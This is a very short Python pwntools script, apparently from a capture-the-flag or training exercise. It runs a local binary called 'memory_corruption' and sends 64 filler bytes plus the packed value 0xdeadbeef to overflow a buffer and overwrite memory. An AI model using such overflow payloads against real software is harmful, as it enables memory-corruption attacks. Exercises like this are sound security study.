#!/usr/bin/python
from pwn import *

p = process( "./memory_corruption")
p.sendline("A" * 64 + p64(0xdeadbeef))
print p.read()
